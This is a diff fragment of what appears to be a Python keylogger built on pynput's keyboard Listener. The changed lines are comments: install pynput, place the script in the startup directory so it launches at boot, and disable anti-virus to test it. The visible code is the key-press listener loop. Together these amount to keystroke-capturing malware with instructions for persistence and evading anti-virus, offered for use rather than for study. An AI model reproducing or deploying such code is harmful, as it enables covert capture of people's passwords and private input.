@@ -12,5 +12,6 @@ def on_press(key):
 with Listener(on_press=on_press) as listener:
     listener.join()
   
-  # Add python file on the startup directory to enable the script to start when computer boots up 
-  # To properly test turn off anti-virus 
+# pip install pynput (on a cmd line terminal)
+# Add python file on the startup directory to enable the script to start when computer boots up 
+# To properly test turn off anti-virus 
